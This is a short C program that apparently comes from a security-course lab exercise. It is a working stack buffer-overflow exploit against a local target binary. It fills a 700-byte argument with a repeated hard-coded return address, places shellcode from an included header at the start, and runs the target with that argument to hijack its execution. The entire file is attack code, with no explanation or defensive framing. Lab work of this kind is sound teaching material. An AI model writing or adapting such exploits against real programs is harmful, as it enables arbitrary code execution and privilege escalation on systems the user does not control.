#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char shcode[sizeof(shellcode)];
  strncpy(shcode, shellcode, sizeof(shcode));
  char *args[3];
  char *env[1];
  char buffer[700];
  long *long_ptr = (long*) buffer;

  for(int i =0; i < 175; i++){
	  *(long_ptr + i) = (int)0xbffff910;
  }

  for(int i =0; i < strlen(shcode); i++){
	  buffer[i] = shcode[i];
  }

  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
